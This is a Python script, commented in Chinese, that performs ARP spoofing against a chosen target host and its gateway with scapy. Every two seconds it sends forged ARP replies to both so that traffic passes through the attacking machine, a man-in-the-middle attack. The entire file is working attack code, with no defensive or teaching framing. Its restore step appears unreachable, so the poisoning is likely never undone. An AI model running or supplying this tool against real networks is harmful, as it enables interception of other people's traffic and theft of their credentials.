#!/usr/bin/env python
# -*- coding:utf-8 -*-
import time
import threading
import sys
import re
import argparse
from scapy.all import send,sr1,ARP  # pylint: disable=no-name-in-module

BROADCAST = 'ff:ff:ff:ff:ff:ff'   # ARP广播地址
INTERFACE = 'eth0'                # 网卡


def parameter_check():
    if len(sys.argv) <= 1:
        print('''
        输入 -h 选项查看执行需要的选项
        ''')
        sys.exit(509)

def get_agrument():
    '''
    添加选项和选项参数获取
    :return:选项参数实例
    '''
    argparse_client=argparse.ArgumentParser(description="输入网关地址和目标地址")
    argparse_client.add_argument('-g',help="网关的ip地址")
    argparse_client.add_argument('-t','--target',help="目标主机的ip地址")
    return argparse_client.parse_args()

def check_ip(ip):
    '''
    ip地址格式检测和格式化
    :param ip:
    :return:
    '''
    pattern_ip = re.compile(r'(2(5[0-5]{1}|[0-4]\d{1})|[0-1]?\d{1,2})(\.(2(5[0-5]{1}|[0-4]\d{1})|[0-1]?\d{1,2})){3}')
    if not re.match(pattern_ip,ip):
        print("IP不符合规范")
        sys.exit(111)
    else:
        return re.match(pattern_ip, ip).group()

def respone_pkt(ipaddr):
    '''
    返回scapy响应包实例
    :param ipaddr: ip地址
    :return: scapy响应包实例
    '''
    ipaddr = check_ip(ipaddr)
    return sr1(ARP(pdst=ipaddr))

class ARPSpoofer(object):
    def __init__(self, interface, gateway,host):
        '''
        ARP欺骗需要的参数
        :param interface: 发送ARP包的网卡
        :param gateway_ip: 网关ip地址
        :param gateway_mac: 网关的mac地址
        :param host: 目标主机返回的响应包
        '''
        self.interface = interface
        self.gateway_ip = gateway.psrc
        self.gateway_mac = gateway.hwsrc
        self.host=host
        # interval in s spoofed ARP packets are sent to targets
        self.interval = 2 #向目标发送ARP欺骗包的间隔
        self._running = False

    def start(self):
        '''
        创建线程，开始ARP欺骗
        '''
        thread = threading.Thread(target=self._spoof, args=[])

        self._running = True
        thread.start()

    def stop(self):
        '''
        结束ARP欺骗
        '''
        self._running = False

    def _spoof(self):
        '''
        进行ARP欺骗的过程
        ARP欺骗开始时，每隔2秒发送全双工ARP欺骗包
        :return:
        '''
        while self._running:
            if not self._running:
                self._restore()
                return
            self._send_spoofed_packets()
            time.sleep(self.interval)

    def _send_spoofed_packets(self):
        '''
        发送ARP欺骗包给目标主机
        :param host: 目标主机的数据包实例。 -->  即scapy接收包实例，如 host=sr1(...)
        :return:
        '''
        # 2 packets = 1 gateway packet, 1 host packet
        # 全双工欺骗包
        # ARP包中op 1为请求 2为响应
        packets = [
            ARP(op=2, psrc=self.host.psrc, pdst=self.gateway_ip, hwdst=self.gateway_mac), #欺骗网关。使网关更新ARP缓存，发送到目标主机的数据包发送到攻击主机上
            ARP(op=2, psrc=self.gateway_ip, pdst=self.host.psrc, hwdst=self.host.hwsrc)   #欺骗目标主机，使目标主机更新ARP缓存，认为攻击主机mac地址为网关的mac地址
        ]

        [send(x, verbose=0, iface=self.interface) for x in packets]

    def _restore(self):
        '''
        发送恢复ARP欺骗的包给网关和目标主机
        :param host:
        :return:
        '''
        # 2 packets = 1 gateway packet, 1 host packet
        # 向网关广播正确的目标主机ip和mac地址
        # 向目标主机广播正确的网关ip和mac
        packets = [
            ARP(op=2, psrc=self.host.psrc, hwsrc=self.host.hwsrc, pdst=self.gateway_ip, hwdst=BROADCAST),
            ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=self.host.psrc, hwdst=BROADCAST)
        ]

        [send(x, verbose=0, iface=self.interface, count=3) for x in packets]

def main():
    parameter_check()
    args=get_agrument()
    arp_app=ARPSpoofer(INTERFACE,respone_pkt(args.g),respone_pkt(args.target))
    print("开始对%s进行ARP欺骗" % args.target)
    arp_app.start()
    while True:
        try:
            command=input("输入stop关闭ARP欺骗攻击\n:")
            if command == "stop":
                func=getattr(arp_app,command)
                func()
                break
            else:
                print("请输入stop关闭ARP攻击")
                continue
        except KeyboardInterrupt:
            pass

if __name__ == "__main__":
    main()